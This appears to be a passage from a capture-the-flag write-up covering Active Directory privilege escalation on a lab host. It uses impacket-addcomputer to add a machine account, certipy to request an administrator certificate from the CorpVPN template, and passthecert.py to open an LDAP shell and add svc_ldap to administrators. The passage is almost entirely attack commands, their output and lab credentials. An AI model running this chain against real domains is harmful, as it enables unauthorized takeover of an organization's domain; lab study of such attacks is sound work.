Creating machine acc & requesting own certificate

When running winPEAS we discovered that we have the following privelege: SeMachineAccountPrivilege which means we can add computer accounts to the domain
  1. Add computer account
    impacket-addcomputer 10.10.11.222/svc_ldap:'lDaP_1n_th3_cle4r!' -computer-name STX$ -computer-pass Password123

[*] Successfully added machine account STX$ with password Password123
  2. Since we can’t login using that account, we can use certipy to request our certificate remotely (in the context of administrator)

certipy-ad req -u 'STX$' -p 'Password123' -ca AUTHORITY-CA -target authority.htb -template CorpVPN -upn administrator@authority.htb -dns authority.authority.htb -dc-ip 10.10.11.222

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 6
[*] Got certificate with multiple identifications
    UPN: 'administrator@authority.htb'
    DNS Host Name: 'authority.authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_authority.pfx'

PassTheCert

  1. Split pfx key into .crt and .key in order to use passthecert.py
    certipy-ad cert -pfx administrator_authority.pfx -nokey -out cert.crt
certipy-ad cert -pfx administrator_authority.pfx -nocert -out cert.key
  2. passthecert to get LDAP shell 
    python3 passthecert.py -dc-ip 10.10.11.222 -crt cert.crt -key cert.key -domain authority.htb -port 636 -action ldap-shell
  3. in ldap shell → add svc_ldap to administrators 
    add_user_to_group svc_ldap administrators
  4. check permissions
